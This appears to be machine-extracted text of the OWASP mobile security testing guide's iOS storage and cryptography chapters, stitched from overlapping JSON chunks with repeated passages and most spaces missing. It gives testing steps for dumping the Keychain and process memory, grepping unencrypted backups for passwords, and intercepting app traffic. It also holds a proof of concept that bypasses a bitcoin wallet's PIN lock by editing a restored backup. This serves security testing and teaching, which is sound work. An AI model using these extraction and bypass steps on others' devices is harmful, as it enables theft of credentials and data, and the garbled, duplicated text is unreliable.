Onanon-jailbrokendevice,youcanuseobjectiontodumptheKeychainitemscreatedandstoredbytheapp. Dynamic Analysis with Xcode and iOS simulator ThistestisonlyavailableonmacOS,asXcodeandtheiOSsimulatorisneeded. Fortestingthelocalstorageandverifyingwhatdataisstoredwithinit,it’snotmandatorytohaveaniOSdevice. With access to the source code and Xcode the app can be build and deployed in the iOS simulator. The file system of the currentdeviceoftheiOSsimulatorisavailablein~/Library/Developer/CoreSimulator/Devices. OncetheappisrunningintheiOSsimulator, youcannavigatetothedirectoryofthelatestsimulatorstartedwiththe followingcommand: $cd~/Library/Developer/CoreSimulator/Devices/$( ls-alht ~/Library/Developer/CoreSimulator/Devices |head -n2| awk'{print$9}' |sed-n'1!p')/data/Containers/Data/Application ThecommandabovewillautomaticallyfindtheUUIDofthelatestsimulatorstarted. Nowyoustillneedtogrepforyour appnameorakeywordinyourapp. ThiswillshowyoutheUUIDoftheapp. grep -iRn keyword. Thenyoucanmonitorandverifythechangesinthefilesystemoftheappandinvestigateifanysensitiveinformationis storedwithinthefileswhileusingtheapp. Dynamic Analysis with Objection Youcanusetheobjectionruntimemobileexplorationtoolkittofindvulnerabilitiescausedbytheapplication’sdatastorage mechanism. ObjectioncanbeusedwithoutaJailbrokendevice,butitwillrequirepatchingtheiOSApplication. Reading the Keychain TouseObjectiontoreadtheKeychain,executethefollowingcommand: 408\\n...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #ioskeychaindump Note:YoumaybeaskedtoauthenticateusingthedevicespasscodeorTouchID Savetheoutputbyadding `--jsonkeychain.json`tothiscommand DumpingtheiOSkeychain... Created Accessible ACL Type Account Service Data ##TestingMemoryforSensitiveData >**Platform:**ios > >**MASVSV1:**MSTG-STORAGE-10 > >**MASVSV2:**MASVS-STORAGE-2 ###Overview ###StaticAnalysis Whenperformingstaticanalysisforsensitivedataexposedviamemory,youshould -trytoidentifyapplicationcomponentsandmapwherethedataisused, -makesurethatsensitivedataishandledwithasfewcomponentsaspossible, -makesurethatobjectreferencesareproperlyremovedoncetheobjectcontainingsensitivedataisnolongerneeded, -makesurethathighlysensitivedataisoverwrittenassoonasitisnolongerneeded, -notpasssuchdataviaimmutabledatatypes,suchas `String`and`NSString`, -avoidnon-primitivedatatypes (becausetheymightleavedatabehind), -overwritethevalueinmemorybeforeremovingreferences, -payattentiontothird-partycomponents (librariesandframeworks).HavingapublicAPIthathandlesdataaccordingtotherecommendationsaboveisagood ↪ indicatorthatdevelopersconsideredtheissuesdiscussedhere. ###DynamicAnalysis ThereareseveralapproachesandtoolsavailablefordynamicallytestingthememoryofaniOSappforsensitivedata. ####RetrievingandAnalyzingaMemoryDump Whetheryouareusingajailbrokenoranon-jailbrokendevice,youcandumptheapp'sprocess memorywith[objection](https://github.com/sensepost/objection ↪ \"Objection\")and[Fridump](https://github.com/Nightbringer21/fridump\"Fridump\").Youcanfindadetailedexplanationofthisprocessinthesection\"[Memory ↪ Dump](../../../Document/0x06c-Reverse-Engineering-and-Tampering.md#memory-dump\"MemoryDump\")\",inthechapter\"TamperingandReverseEngineeringoniOS\". Afterthememoryhasbeendumped(e.g.toafilecalled\"memory\"),dependingonthenatureofthedatayou'relookingfor,you'llneedasetofdifferenttoolsto ↪ processandanalyzethatmemorydump.Forinstance,ifyou'refocusingonstrings,itmightbesufficientforyoutoexecutethecommand`strings`or`rabin2 ↪ -zz`toextractthosestrings. ```bash ##usingstrings $stringsmemory >strings.txt ##usingrabin2 $rabin2 -ZZmemory >strings.txt Openstrings.txtinyourfavoriteeditoranddigthroughittoidentifysensitiveinformation. However if you’d like to inspect other kind of data, you’d rather want to use radare2 and its search capabilities. See radare2’shelponthesearchcommand(/?) formoreinformationandalistofoptions. Thefollowingshowsonlyasubset ofthem: $r2 <name_of_your_dump_file> [0x00000000]>/? Usage:/[!bf][arg] Searchstuff (see'e??search' foroptions) |Useio.vaforsearchinginnonvirtualaddressingspaces |/foo\\x00 searchforstring 'foo\\0' |/c[ar] searchforcryptomaterials |/e/E.F/i matchregularexpression |/ifoo searchforstring 'foo' ignoringcase |/m[?][ebm]magicfile searchformagic,filesystemsorbinaryheaders |/v[1248]value lookforan `cfg.bigendian`32bitvalue |/wfoo searchforwidestring 'f\\0o\\0o\\0' |/xff0033 searchforhexstring |/zminmax searchforstringsofgivensize ... Runtime Memory Analysis By using r2frida you can analyze and inspect the app’s memory while running and without needing to dump it. For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values,etc. Whendoingso,remembertoprependthesearchcommand(andanyotherr2fridaspecificcommands)with abackslash: afterstartingthesessionwithr2 frida://usb//<name_of_your_app>. Formoreinformation,optionsandapproaches,pleaserefertosection“In-MemorySearch”inthechapter“Tamperingand ReverseEngineeringoniOS”. 409\\nTesting Backups for Sensitive Data Platform: ios MASVSV1: MSTG-STORAGE-8 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis Abackupofadeviceonwhichamobileapplicationhasbeeninstalledwillincludeallsubdirectories(exceptforLibrary/ Caches/)andfilesintheapp’sprivatedirectory. Therefore,avoidstoringsensitivedatainplaintextwithinanyofthefilesorfoldersthatareintheapp’sprivatedirectory orsubdirectories. Although all the files in Documents/ and Library/Application Support/ are always backed up by default, you can excludefilesfromthebackupbycallingNSURLsetResourceValue:forKey:error: withtheNSURLIsExcludedFromBack- upKeykey. YoucanusetheNSURLIsExcludedFromBackupKeyandCFURLIsExcludedFromBackupKeyfilesystempropertiestoexclude filesanddirectoriesfrombackups. Anappthatneedstoexcludemanyfilescandosobycreatingitsownsubdirectory andmarkingthatdirectoryexcluded. Appsshouldcreatetheirowndirectoriesforexclusioninsteadofexcludingsystem- defineddirectories. Bothfilesystempropertiesarepreferabletothedeprecatedapproachofdirectlysettinganextendedattribute. Allapps runningoniOSversion5.1andlatershouldusethesepropertiestoexcludedatafrombackups. ThefollowingissampleObjective-CcodeforexcludingafilefromabackuponiOS5.1andlater: -(BOOL)addSkipBackupAttributeToItemAtPath:(NSString *)filePathString { NSURL*URL=[NSURLfileURLWithPath:filePathString]; assert([[NSFileManagerdefaultManager]fileExistsAtPath:[URLpath]]); NSError *error =nil; BOOLsuccess =[URLsetResourceValue:[NSNumbernumberWithBool:YES] forKey:NSURLIsExcludedFromBackupKeyerror: &error]; if(!success){ NSLog(@\"Errorexcluding%@frombackup%@\",[URLlastPathComponent], error); } return success; } ThefollowingissampleSwiftcodeforexcludingafilefromabackuponiOS5.1andlater,seeSwiftexcludingfilesfrom iCloudbackupformoreinformation: enum ExcludeFileError:Error { case fileDoesNotExist case error(String) } func excludeFileFromBackup(filePath:URL)->Result<Bool,ExcludeFileError>{ varfile =filePath do{ ifFileManager.default.fileExists(atPath:file.path){ varres=URLResourceValues() res.isExcludedFromBackup =true tryfile.setResourceValues(res) return .success(true) }else { return .failure(.fileDoesNotExist) } }catch { return .failure(.error(\"Errorexcluding \\(file.lastPathComponent)frombackup \\(error)\")) } } 410\\nDynamic Analysis Inordertotestthebackup,youobviouslyneedtocreateonefirst. ThemostcommonwaytocreateabackupofaniOS deviceisbyusingiTunes,whichisavailableforWindows,LinuxandofcoursemacOS(tillmacOSMojave). Whencreating abackupviaiTunesyoucanalwaysonlybackupthewholedeviceandnotselectjustasingleapp. Makesurethatthe option“Encryptlocalbackup”iniTunesisnotset,sothatthebackupisstoredincleartextonyourharddrive. iTunes is not available anymore from macOS Catalina onwards. Managing of an iOS device, including updates, backupandrestorehasbeenmovedtotheFinderapp. Theapproachremainsthesame,asdescribedabove. AftertheiOSdevicehasbeenbackedup,youneedtoretrievethefilepathofthebackup,whicharedifferentlocations oneachOS.TheofficialAppledocumentationwillhelpyoutolocatebackupsofyouriPhone,iPad,andiPodtouch. WhenyouwanttonavigatetothebackupfolderuptoHighSierrayoucaneasilydoso. StartingwithmacOSMojaveyou willgetthefollowingerror(evenasroot): $pwd /Users/foo/Library/ApplicationSupport $ls -alh MobileSync ls:MobileSync:Operationnotpermitted Thisisnotapermissionissueofthebackupfolder, butanewfeatureinmacOSMojave. Youcansolvethisproblemby grantingfulldiskaccesstoyourterminalapplicationbyfollowingtheexplanationonOSXDaily. BeforeyoucanaccessthedirectoryyouneedtoselectthefolderwiththeUDIDofyourdevice. Checkthesection“Getting theUDIDofaniOSdevice”inthe“iOSBasicSecurityTesting”chapteronhowtoretrievetheUDID. OnceyouknowtheUDIDyoucannavigateintothisdirectoryandyouwillfindthefullbackupofthewholedevice,which doesincludepictures,appdataandwhatevermighthavebeenstoredonthedevice. Reviewthedatathat’sinthebackedupfilesandfolders. Thestructureofthedirectoriesandfilenamesisobfuscated andwilllooklikethis: $pwd /Users/foo/Library/ApplicationSupport/MobileSync/Backup/416f01bd160932d2bf2f95f1f142bc29b1c62dcb/00 $ls |head -n3 000127b08898088a8a169b4f63b363a3adcf389b 0001fe89d0d03708d414b36bc6f706f567b08d66 000200a644d7d2c56eec5b89c1921dacbec83c3e Therefore,it’snotstraightforwardtonavigatethroughitandyouwillnotfindanyhintsoftheappyouwanttoanalyzein thedirectoryorfilename. YoucanconsiderusingtheiMazingsharewareutilitytoassisthere. Performadevicebackup withiMazinganduseitsbuilt-inbackupexplorertoeasilyanalyzeappcontainercontentsincludingoriginalpathsandfile names. WithoutiMazingorsimilarsoftwareyoumayneedtoresorttousinggreptoidentifysensitivedata. Thisisnotthemost thoroughapproachbutyoucantrysearchingforsensitivedatathatyouhavekeyedinwhileusingtheappbeforeyou madethebackup. Forexample: theusername,password,creditcarddata,PIIoranydatathatisconsideredsensitivein thecontextoftheapp. ~/Library/ApplicationSupport/MobileSync/Backup/<UDID> grep -iRn \"password\" . AsdescribedintheStaticAnalysissection,anysensitivedatathatyou’reabletofindshouldbeexcludedfromthebackup, encryptedproperlybyusingtheKeychainornotstoredonthedeviceinthefirstplace. Toidentifyifabackupisencrypted,youcancheckthekeynamed“IsEncrypted”fromthefile“Manifest.plist”,locatedat therootofthebackupdirectory. Thefollowingexampleshowsaconfigurationindicatingthatthebackupisencrypted: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 140
    }
  },
  {
    "text": "ls:MobileSync:Operationnotpermitted Thisisnotapermissionissueofthebackupfolder, butanewfeatureinmacOSMojave. Youcansolvethisproblemby grantingfulldiskaccesstoyourterminalapplicationbyfollowingtheexplanationonOSXDaily. BeforeyoucanaccessthedirectoryyouneedtoselectthefolderwiththeUDIDofyourdevice. Checkthesection“Getting theUDIDofaniOSdevice”inthe“iOSBasicSecurityTesting”chapteronhowtoretrievetheUDID. OnceyouknowtheUDIDyoucannavigateintothisdirectoryandyouwillfindthefullbackupofthewholedevice,which doesincludepictures,appdataandwhatevermighthavebeenstoredonthedevice. Reviewthedatathat’sinthebackedupfilesandfolders. Thestructureofthedirectoriesandfilenamesisobfuscated andwilllooklikethis: $pwd /Users/foo/Library/ApplicationSupport/MobileSync/Backup/416f01bd160932d2bf2f95f1f142bc29b1c62dcb/00 $ls |head -n3 000127b08898088a8a169b4f63b363a3adcf389b 0001fe89d0d03708d414b36bc6f706f567b08d66 000200a644d7d2c56eec5b89c1921dacbec83c3e Therefore,it’snotstraightforwardtonavigatethroughitandyouwillnotfindanyhintsoftheappyouwanttoanalyzein thedirectoryorfilename. YoucanconsiderusingtheiMazingsharewareutilitytoassisthere. Performadevicebackup withiMazinganduseitsbuilt-inbackupexplorertoeasilyanalyzeappcontainercontentsincludingoriginalpathsandfile names. WithoutiMazingorsimilarsoftwareyoumayneedtoresorttousinggreptoidentifysensitivedata. Thisisnotthemost thoroughapproachbutyoucantrysearchingforsensitivedatathatyouhavekeyedinwhileusingtheappbeforeyou madethebackup. Forexample: theusername,password,creditcarddata,PIIoranydatathatisconsideredsensitivein thecontextoftheapp. ~/Library/ApplicationSupport/MobileSync/Backup/<UDID> grep -iRn \"password\" . AsdescribedintheStaticAnalysissection,anysensitivedatathatyou’reabletofindshouldbeexcludedfromthebackup, encryptedproperlybyusingtheKeychainornotstoredonthedeviceinthefirstplace. Toidentifyifabackupisencrypted,youcancheckthekeynamed“IsEncrypted”fromthefile“Manifest.plist”,locatedat therootofthebackupdirectory. Thefollowingexampleshowsaconfigurationindicatingthatthebackupisencrypted: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> ... <key>Date</key> <date>2021-03-12T17:43:33Z</date> <key>IsEncrypted</key> <true/> ... </plist> 411\\nIn case you need to work with an encrypted backup, there are some Python scripts in DinoSec’s GitHub repo, such as backup_tool.pyandbackup_passwd.py,thatwillserveasagoodstartingpoint. However,notethattheymightnotwork withthelatestiTunes/Finderversionsandmightneedtobetweaked. YoucanalsousethetooliOSbackuptoeasilyreadandextractfilesfromapassword-encryptediOSbackup. Proof of Concept: Removing UI Lock with Tampered Backup Asdiscussedearlier,sensitivedataisnotlimitedtojustuserdataandPII.Itcanalsobeconfigurationorsettingsfilesthat affectappbehavior,restrictfunctionality,orenablesecuritycontrols. Ifyoutakealookattheopensourcebitcoinwallet app,Bither,you’llseethatit’spossibletoconfigureaPINtolocktheUI.Andafterafeweasysteps,youwillseehowto bypassthisUIlockwithamodifiedbackuponanon-jailbrokendevice. Afteryouenablethepin,useiMazingtoperformadevicebackup: 1. SelectyourdevicefromthelistundertheAVAILABLEmenu. 2. ClickthetopmenuoptionBackUp. 3. Followpromptstocompletethebackupusingdefaults. Nextyoucanopenthebackuptoviewappcontainerfileswithinyourtargetapp: 1. SelectyourdeviceandclickBackupsonthetoprightmenu. 2. ClickthebackupyoucreatedandselectView. 3. NavigatetotheBitherappfromtheAppsdirectory. 412\\nAtthispointyoucanviewallthebackedupcontentforBither. This is where you can begin parsing through the files looking for sensitive data. In the screenshot you’ll see the net. bither.plistfilewhichcontainsthepin_codeattribute. ToremovetheUIlockrestriction,simplydeletethepin_code attributeandsavethechanges. Fromthereit’spossibletoeasilyrestorethemodifiedversionofnet.bither.plistbackontothedeviceusingthelicensed versionofiMazing. Thefreeworkaround,however,istofindtheplistfileintheobfuscatedbackupgeneratedbyiTunes/Finder. Socreateyour backupofthedevicewithBither’sPINcodeconfigured. Then,usingthestepsdescribedearlier,findthebackupdirectory andgrepfor“pin_code”asshownbelow. $~/Library/ApplicationSupport/MobileSync/Backup/<UDID> $grep -iRn \"pin_code\" . Binaryfile./13/135416dd5f251f9251e0f07206277586b7eac6f6matches You’llseetherewasamatchonabinaryfilewithanobfuscatedname. Thisisyournet.bither.plistfile. Goaheadand renamethefilegivingitaplistextensionsoXcodecaneasilyopenitupforyou. 413\\nAgain,removethepin_codeattributefromtheplistandsaveyourchanges. Renamethefilebacktotheoriginalname (i.e.,withouttheplistextension)andperformyourbackuprestore. Whentherestoreiscompleteyou’llseethatBitherno longerpromptsyouforthePINcodewhenlaunched. Finding Sensitive Data in the Keyboard Cache Platform: ios MASVSV1: MSTG-STORAGE-5 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis • Searchthroughthesourcecodeforsimilarimplementations,suchas textObject.autocorrectionType =UITextAutocorrectionTypeNo; textObject.secureTextEntry =YES; • OpenxibandstoryboardfilesintheInterface BuilderofXcodeandverifythestatesofSecure Text Entryand CorrectionintheAttributes Inspectorfortheappropriateobject. The application must prevent the caching of sensitive information entered into text fields. You can prevent caching by disablingitprogrammatically,usingthetextObject.autocorrectionType = UITextAutocorrectionTypeNodirectivein thedesiredUITextFields, UITextViews, andUISearchBars. Fordatathatshouldbemasked, suchasPINsandpasswords, settextObject.secureTextEntrytoYES. UITextField *textField =[[UITextFieldalloc ]initWithFrame:frame ]; textField.autocorrectionType =UITextAutocorrectionTypeNo; Dynamic Analysis IfajailbrokeniPhoneisavailable,executethefollowingsteps: 1. ResetyouriOSdevicekeyboardcachebynavigatingtoSettings > General > Reset > Reset Keyboard Dictio- nary. 414\\n2. Usetheapplicationandidentifythefunctionalitiesthatallowuserstoentersensitivedata. 3. Dumpthekeyboardcachefilewiththeextension.datinthefollowingdirectoryanditssubdirectories. (whichmight bedifferentforiOSversionsbefore8.0): /private/var/mobile/Library/Keyboard/ 4. Lookforsensitivedata,suchasusername,passwords,emailaddresses,andcreditcardnumbers. Ifthesensitive datacanbeobtainedviathekeyboardcachefile,theappfailsthistest. UITextField *textField =[[UITextFieldalloc ]initWithFrame:frame ]; textField.autocorrectionType =UITextAutocorrectionTypeNo; Ifyoumustuseanon-jailbrokeniPhone: 1. Resetthekeyboardcache. 2. Keyinallsensitivedata. 3. Usetheappagainanddeterminewhetherautocorrectsuggestspreviouslyenteredsensitiveinformation. Determining Whether Sensitive Data Is Shared with Third Parties Platform: ios MASVSV1: MSTG-STORAGE-4 MASVSV2: MASVS-STORAGE-2 Overview Sensitiveinformationmightbeleakedtothirdpartiesbyseveralmeans. OniOStypicallyviathird-partyservicesembed- dedintheapp. The features these services provide can involve tracking services to monitor the user’s behavior while using the app, sellingbanneradvertisements,orimprovingtheuserexperience. Thedownsideisthatdevelopersdon’tusuallyknowthedetailsofthecodeexecutedviathird-partylibraries. Consequently, nomoreinformationthanisnecessaryshouldbesenttoaservice,andnosensitiveinformationshouldbedisclosed. Mostthird-partyservicesareimplementedintwoways: • withastandalonelibrary • withafullSDK Static Analysis To determine whether API calls and functions provided by the third-party library are used according to best practices, reviewtheirsourcecode,requestedpermissionsandcheckforanyknownvulnerabilities. Alldatathat’ssenttothird-partyservicesshouldbeanonymizedtopreventexposureofPII(PersonalIdentifiableInforma- tion)thatwouldallowthethirdpartytoidentifytheuseraccount. Nootherdata(suchasIDsthatcanbemappedtoa useraccountorsession)shouldbesenttoathirdparty. Dynamic Analysis Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server,youcanperformdynamicanalysisbylaunchingaman-in-the-middle(MITM)attackwithBurpSuiteProfessionalor OWASPZAP.Onceyouroutethetrafficthroughtheinterceptionproxy,youcantrytosniffthetrafficthatpassesbetween theappandserver. Allapprequeststhataren’tsentdirectlytotheserveronwhichthemainfunctionishostedshould becheckedforsensitiveinformation,suchasPIIinatrackeroradservice. 415\\niOS Cryptographic APIs Overview Inthe“MobileAppCryptography”chapter,weintroducedgeneralcryptographybestpracticesanddescribedtypicalissues thatcanoccurwhencryptographyisusedincorrectly. Inthischapter,we’llgointomoredetailoniOS’scryptographyAPIs. We’llshowhowtoidentifyusageofthoseAPIsinthesourcecodeandhowtointerpretcryptographicconfigurations. When reviewingcode,makesuretocomparethecryptographicparametersusedwiththecurrentbestpracticeslinkedfromthis guide. Appleprovideslibrariesthatincludeimplementationsofmostcommoncryptographicalgorithms. Apple’sCryptographic ServicesGuideisagreatreference. Itcontainsgeneralizeddocumentationofhowtousestandardlibrariestoinitialize andusecryptographicprimitives,informationthatisusefulforsourcecodeanalysis. CryptoKit AppleCryptoKitwasreleasedwithiOS13andisbuiltontopofApple’snativecryptographiclibrarycorecryptowhichis FIPS140-2validated. TheSwiftframeworkprovidesastronglytypedAPIinterface,haseffectivememorymanagement, conformstoequatable,andsupportsgenerics. CryptoKitcontainssecurealgorithmsforhashing,symmetric-keycryptog- raphy, and public-key cryptography. The framework can also utilize the hardware based key manager from the Secure Enclave. AppleCryptoKitcontainsthefollowingalgorithms: Hashes: • MD5(InsecureModule) • SHA1(InsecureModule) • SHA-2256-bitdigest • SHA-2384-bitdigest • SHA-2512-bitdigest Symmetric-Key: • MessageAuthenticationCodes(HMAC) • AuthenticatedEncryption – AES-GCM – ChaCha20-Poly1305 Public-Key: • KeyAgreement – Curve25519 – NISTP-256 – NISTP-384 – NISTP-512 Examples: Generatingandreleasingasymmetrickey: letencryptionKey=SymmetricKey(size:.bits256) CalculatingaSHA-2512-bitdigest: letrawString=\"OWASPMTSG\" letrawData=Data(rawString.utf8) lethash=SHA512.hash(data:rawData)//Computethedigest lettextHash=String(describing:hash) print(textHash)//Printhashtext FormoreinformationaboutAppleCryptoKit,pleasevisitthefollowingresources: 416\\n• AppleCryptoKit|AppleDeveloperDocumentation • PerformingCommonCryptographicOperations|AppleDeveloperDocumentation • WWDC2019session709|CryptographyandYourApps • HowtocalculatetheSHAhashofaStringorDatainstance|HackingwithSwift CommonCrypto, SecKey and Wrapper libraries ThemostcommonlyusedClassforcryptographicoperationsistheCommonCrypto,whichispackedwiththeiOSruntime. ThefunctionalityofferedbytheCommonCryptoobjectcanbestbedissectedbyhavingalookatthesourcecodeofthe headerfile: • TheCommoncryptor.hgivestheparametersforthesymmetriccryptographicoperations. • TheCommonDigest.hgivestheparametersforthehashingAlgorithms. • TheCommonHMAC.hgivestheparametersforthesupportedHMACoperations. • TheCommonKeyDerivation.hgivestheparametersforsupportedKDFfunctions. • TheCommonSymmetricKeywrap.hgivesthefunctionusedforwrappingasymmetrickeywithaKeyEncryptionKey. Unfortunately,CommonCryptorlacksafewtypesofoperationsinitspublicAPIs,suchas: GCMmodeisonlyavailablein itsprivateAPIsSeeitssourcecode. Forthis,anadditionalbindingheaderisnecessaryorotherwrapperlibrariescanbe used. Next,forasymmetricoperations,AppleprovidesSecKey. AppleprovidesaniceguideinitsDeveloperDocumentationon howtousethis. Asnotedbefore: somewrapper-librariesexistforbothinordertoprovideconvenience. Typicallibrariesthatareusedare, forinstance: • IDZSwiftCommonCrypto • Heimdall • SwiftyRSA • RNCryptor • Arcane Third party libraries Therearevariousthirdpartylibrariesavailable,suchas: • CJOSE:WiththeriseofJWE,andthelackofpublicsupportforAESGCM,otherlibrarieshavefoundtheirway,such asCJOSE.CJOSEstillrequiresahigherlevelwrappingastheyonlyprovideaC/C++implementation. • CryptoSwift: AlibraryinSwift,whichcanbefoundatGitHub. Thelibrarysupportsvarioushash-functions,MAC- functions,CRC-functions,symmetricciphers,andpassword-basedkeyderivationfunctions. Itisnotawrapper,but afullyself-implementedversionofeachoftheciphers.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 141
    }
  },
  {
    "text": "libraries ThemostcommonlyusedClassforcryptographicoperationsistheCommonCrypto,whichispackedwiththeiOSruntime. ThefunctionalityofferedbytheCommonCryptoobjectcanbestbedissectedbyhavingalookatthesourcecodeofthe headerfile: • TheCommoncryptor.hgivestheparametersforthesymmetriccryptographicoperations. • TheCommonDigest.hgivestheparametersforthehashingAlgorithms. • TheCommonHMAC.hgivestheparametersforthesupportedHMACoperations. • TheCommonKeyDerivation.hgivestheparametersforsupportedKDFfunctions. • TheCommonSymmetricKeywrap.hgivesthefunctionusedforwrappingasymmetrickeywithaKeyEncryptionKey. Unfortunately,CommonCryptorlacksafewtypesofoperationsinitspublicAPIs,suchas: GCMmodeisonlyavailablein itsprivateAPIsSeeitssourcecode. Forthis,anadditionalbindingheaderisnecessaryorotherwrapperlibrariescanbe used. Next,forasymmetricoperations,AppleprovidesSecKey. AppleprovidesaniceguideinitsDeveloperDocumentationon howtousethis. Asnotedbefore: somewrapper-librariesexistforbothinordertoprovideconvenience. Typicallibrariesthatareusedare, forinstance: • IDZSwiftCommonCrypto • Heimdall • SwiftyRSA • RNCryptor • Arcane Third party libraries Therearevariousthirdpartylibrariesavailable,suchas: • CJOSE:WiththeriseofJWE,andthelackofpublicsupportforAESGCM,otherlibrarieshavefoundtheirway,such asCJOSE.CJOSEstillrequiresahigherlevelwrappingastheyonlyprovideaC/C++implementation. • CryptoSwift: AlibraryinSwift,whichcanbefoundatGitHub. Thelibrarysupportsvarioushash-functions,MAC- functions,CRC-functions,symmetricciphers,andpassword-basedkeyderivationfunctions. Itisnotawrapper,but afullyself-implementedversionofeachoftheciphers. Itisimportanttoverifytheeffectiveimplementationofa function. • OpenSSL:OpenSSListhetoolkitlibraryusedforTLS,writteninC.Mostofitscryptographicfunctionscanbeused todothevariouscryptographicactionsnecessary,suchascreating(H)MACs,signatures,symmetric-&asymmetric ciphers,hashing,etc.. Therearevariouswrappers,suchasOpenSSLandMIHCrypto. • LibSodium: Sodium is a modern, easy-to-use software library for encryption, decryption, signatures, password hashingandmore. Itisaportable,cross-compilable,installable,packageableforkofNaCl,withacompatibleAPI, andanextendedAPItoimproveusabilityevenfurther. SeeLibSodiumsdocumentationformoredetails. Thereare somewrapperlibraries,suchasSwift-sodium,NAChloride,andlibsodium-ios. • Tink: AnewcryptographylibrarybyGoogle. Googleexplainsitsreasoningbehindthelibraryonitssecurityblog. ThesourcescanbefoundatTinksGitHubrepository. • Themis: a Crypto library for storage and messaging for Swift, Obj-C, Android/Java, С++, JS, Python, Ruby, PHP, Go. Themis uses LibreSSL/OpenSSL engine libcrypto as a dependency. It supports Objective-C and Swift for key generation,securemessaging(e.g.payloadencryptionandsigning),securestorageandsettingupasecuresession. Seetheirwikiformoredetails. • Others: Therearemanyotherlibraries,suchasCocoaSecurity,Objective-C-RSA,andaerogear-ios-crypto. Some ofthesearenolongermaintainedandmightneverhavebeensecurityreviewed. Likealways,itisrecommended tolookforsupportedandmaintainedlibraries. 417\\n• DIY: An increasing amount of developers have created their own implementation of a cipher or a cryptographic function. This practice is highly discouraged and should be vetted very thoroughly by a cryptography expert if used. Key Management Therearevariousmethodsonhowtostorethekeyonthedevice. Notstoringakeyatallwillensurethatnokeymaterial canbedumped. ThiscanbeachievedbyusingaPasswordKeyDerivationfunction,suchasPKBDF-2. Seetheexample below: funcpbkdf2SHA1(password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ returnpbkdf2(hash:CCPBKDFAlgorithm(kCCPRFHmacAlgSHA1),password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } funcpbkdf2SHA256(password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ returnpbkdf2(hash:CCPBKDFAlgorithm(kCCPRFHmacAlgSHA256),password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } funcpbkdf2SHA512(password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ returnpbkdf2(hash:CCPBKDFAlgorithm(kCCPRFHmacAlgSHA512),password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } funcpbkdf2(hash:CCPBKDFAlgorithm,password:String,salt:Data,keyByteCount:Int,rounds:Int)->Data?{ letpasswordData=password.data(using:String.Encoding.utf8)! varderivedKeyData=Data(repeating:0,count:keyByteCount) letderivedKeyDataLength=derivedKeyData.count letderivationStatus=derivedKeyData.withUnsafeMutableBytes{derivedKeyBytesin salt.withUnsafeBytes{saltBytesin CCKeyDerivationPBKDF( CCPBKDFAlgorithm(kCCPBKDF2), password,passwordData.count, saltBytes,salt.count, hash, UInt32(rounds), derivedKeyBytes,derivedKeyDataLength ) } } ifderivationStatus!=0{ //Error returnnil } returnderivedKeyData } functestKeyDerivation(){ letpassword=\"password\" letsalt=Data([0x73,0x61,0x6C,0x74,0x44,0x61,0x74,0x61]) letkeyByteCount=16 letrounds=100_000 letderivedKey=pbkdf2SHA1(password:password,salt:salt,keyByteCount:keyByteCount,rounds:rounds) } • Source: https://stackoverflow.com/questions/8569555/pbkdf2-using-commoncrypto-on-ios,testedinthetestsuite oftheArcanelibrary When you need to store the key, it is recommended to use the Keychain as long as the protection class chosen is not kSecAttrAccessibleAlways. Storingkeysinanyotherlocation,suchastheNSUserDefaults,propertylistfilesorbyany othersinkfromCoreDataorRealm,isusuallylesssecurethanusingtheKeyChain. EvenwhenthesyncofCoreDataor RealmisprotectedbyusingNSFileProtectionCompletedataprotectionclass,westillrecommendusingtheKeyChain. Seethechapter“DataStorageoniOS”formoredetails. TheKeyChainsupportstwotypeofstoragemechanisms: akeyiseithersecuredbyanencryptionkeystoredinthesecure enclaveorthekeyitselfiswithinthesecureenclave. ThelatteronlyholdswhenyouuseanECDHsigningkey. Seethe AppleDocumentationformoredetailsonitsimplementation. Thelastthreeoptionsconsistofusinghardcodedencryptionkeysinthesourcecode,havingapredictablekeyderivation functionbasedonstableattributes,andstoringgeneratedkeysinplacesthataresharedwithotherapplications. Using hardcoded encryption keys is obviously not the way to go, as this would mean that every instance of the application usesthesameencryptionkey. Anattackerneedsonlytodotheworkonceinordertoextractthekeyfromthesource code(whetherstorednativelyorinObjective-C/Swift). Consequently,theattackercandecryptanyotherdatathatwas encryptedbytheapplication. Next,whenyouhaveapredictablekeyderivationfunctionbasedonidentifierswhichare 418\\naccessibletootherapplications,theattackeronlyneedstofindtheKDFandapplyittothedeviceinordertofindthekey. Lastly,storingsymmetricencryptionkeyspubliclyalsoishighlydiscouraged. Twomorenotionsyoushouldneverforgetwhenitcomestocryptography: 1. Alwaysencrypt/verifywiththepublickeyandalwaysdecrypt/signwiththeprivatekey. 2. Neverreusethekey(pair)foranotherpurpose: thismightallowleakinginformationaboutthekey: haveaseparate keypairforsigningandaseparatekey(pair)forencryption. Random Number Generator AppleprovidesaRandomizationServicesAPI,whichgeneratescryptographicallysecurerandomnumbers. TheRandomizationServicesAPIusestheSecRandomCopyBytesfunctiontogeneratenumbers. Thisisawrapperfunction forthe/dev/randomdevicefile,whichprovidescryptographicallysecurepseudorandomvaluesfrom0to255. Makesure thatallrandomnumbersaregeneratedwiththisAPI.Thereisnoreasonfordeveloperstouseadifferentone. Verifying the Configuration of Cryptographic Standard Algorithms Platform: ios MASVSV1: MSTG-CRYPTO-2,MSTG-CRYPTO-3 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Foreachofthelibrariesthatareusedbytheapplication,theusedalgorithmsandcryptographicconfigurationsneedto beverifiedtomakesuretheyarenotdeprecatedandusedcorrectly. Payattentiontohow-to-be-removedkey-holdingdatastructuresandplain-textdatastructuresaredefined. Ifthekeyword 